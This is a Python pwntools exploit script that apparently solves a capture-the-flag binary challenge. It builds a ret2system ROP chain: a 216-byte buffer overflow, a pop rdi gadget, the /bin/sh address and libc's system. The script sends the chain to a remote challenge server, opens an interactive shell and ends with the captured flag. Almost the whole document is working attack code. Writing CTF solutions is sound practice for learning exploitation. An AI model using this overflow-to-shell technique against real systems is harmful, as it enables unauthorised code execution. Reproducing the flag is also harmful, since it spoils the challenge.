# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    elif args.LOCAL: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    if args.REMOTE:
        p.sendline(b"13523090")
        p.sendline(b"7")

    exe = './7'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'

    libc = ELF('./libc.so.6', checksec=False)
    libc.address = 0x00007ffff7d90000               #  server's libc base address
    system = libc.sym['system']                     #  server's libc system address
    binsh = next(libc.search(b'/bin/sh'))           #  server's libc /bin/sh address
    print(f"System: {hex(system)}")
    print(f"Binsh: {hex(binsh)}")
    pop_rdi = 0x000000000040151a                    # ropper --file 7 --search "pop rdi"
    offset = 216                                    # offset = 208 + ret = 216

    # ret2system
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(0x40101a)                        # ret addr (ropper --file 7 --search "ret")
    payload += p64(system)

    p.sendline(payload)
    p.interactive()
    #do ls, then do 'cat 7.flag.txt'

solve()

# Orkom3{Don't move, okay?_267231d3132c720c}